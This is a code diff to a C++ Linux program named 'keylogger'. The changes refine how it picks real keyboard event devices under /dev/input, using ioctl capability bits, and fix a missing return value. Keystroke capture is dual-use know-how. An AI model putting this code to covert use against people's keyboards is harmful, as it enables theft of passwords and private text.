@@ -55,6 +55,7 @@ keylogger::KeyEvent keylogger::KeyListener::Listen()
     {
         std::cerr << "Error: " << e.what() << std::endl;
     }
+    return {0, 0};
 }
 
 void keylogger::KeyListener::FindInputDevices()
@@ -90,7 +91,7 @@ void keylogger::KeyListener::FindInputDevices()
     std::cout << "Input logger active. Press Ctrl+C to stop." << std::endl;
 }
 
-bool keylogger::KeyListener::IsInputDevice(const std::string& device_path)
+bool keylogger::KeyListener::IsInputDevice(const std::string &device_path)
 {
     // Check if it's an event device
     if (device_path.find("event") == std::string::npos)
@@ -98,18 +99,33 @@ bool keylogger::KeyListener::IsInputDevice(const std::string& device_path)
         return false;
     }
 
-    // Try to open the device to check if it's accessible
-    const int fd = open(device_path.c_str(), O_RDONLY | O_NONBLOCK);
+    // Try to open the device
+    int fd = open(device_path.c_str(), O_RDONLY | O_NONBLOCK);
     if (fd == -1)
     {
         return false;
     }
 
-    // Get device capabilities to determine if it's a keyboard or mouse
+    // Check if device supports EV_KEY
     unsigned long evbit = 0;
     ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);
-    close(fd);
+    if (!(evbit & (1 << EV_KEY)))
+    {
+        close(fd);
+        return false;
+    }
 
-    // Check if device has key or button events
-    return (evbit & (1 << EV_KEY)) != 0;
+    // Now check for real keyboard keys, not just buttons like BTN_LEFT
+    unsigned char keybit[KEY_MAX / 8 + 1] = {};
+    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit);
+
+    auto has_key = [&](int code) {
+        return keybit[code / 8] & (1 << (code % 8));
+    };
+
+    // Filter: only return true if it's a real keyboard
+    bool is_keyboard = has_key(KEY_A) || has_key(KEY_ENTER);
+
+    close(fd);
+    return is_keyboard;
 }
